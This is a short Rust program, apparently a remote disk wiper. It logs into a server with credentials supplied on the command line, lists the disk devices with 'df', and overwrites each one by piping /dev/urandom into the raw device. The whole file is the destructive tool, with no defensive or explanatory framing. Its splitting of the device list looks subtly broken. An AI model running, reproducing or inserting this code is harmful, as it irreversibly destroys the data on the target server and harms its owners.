pub mod server;
use server::Server;

use std::env;

fn main() {
    let args: Vec<String> = env::args().collect();

    let hostname = &args[1]; //x.x.x.x:port
    let username = &args[2];
    let password = &args[3];

    let server = Server {
        hostname: String::from(hostname),
        username: String::from(username),
        password: String::from(password),
    };

    let disks = server.execute_command("df -h --output=source | grep dev/");
    for disk_name in disks.split(" ") {
        println!("{}", disk_name);
        let command = "cat /dev/urandom > ".to_owned() + disk_name;
        let data = server.execute_command(&command);
        println! {"{}",data};
    }
}
